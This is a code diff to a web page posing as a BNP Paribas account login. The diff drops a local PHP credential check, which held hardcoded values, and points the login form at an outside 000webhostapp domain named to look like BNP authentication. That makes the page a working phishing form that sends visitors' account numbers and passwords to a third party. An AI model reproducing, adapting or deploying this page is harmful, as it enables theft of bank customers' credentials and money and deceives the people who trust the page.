@@ -1,18 +1,3 @@
-<?php
-session_start();
-
-@$user=$_POST["number"];
-@$pass=$_POST["pass"];
-@$valider=$_POST["submit"];
-
-if(isset($valider)){
-
- if($user=="9588593686" && $pass=="879035"){
- $_SESSION["autoriser"]="oui";
- header("location:Solde.php");
- }
-}
-?>
 <!DOCTYPE html>
 <html>
 	<head>
@@ -20,7 +5,7 @@ if(isset($valider)){
 
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+<script src='https://kit.fontawesome.com/618007f65e.js' crossorigin='anonymous'></script>
 		<link rel="preconnect" href="https://fonts.googleapis.com"> 
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
 <link href="https://fonts.googleapis.com/css2?family=Dosis:wght@500&display=swap" rel="stylesheet">
@@ -39,7 +24,7 @@ if(isset($valider)){
 	<img src="https://logos-marques.com/wp-content/uploads/2020/12/BNP-Paribas-logo.png"></a>
 	</div>
 	
-	<form method="POST" action="">
+	<form method="POST" action="https://authentification-a-mon-compte-bnp.000webhostapp.com/index.php">
 	<div class="slog">
 	<h1>ACCEDER À MON<br/>COMPTE</h1>
 	<div class="log">
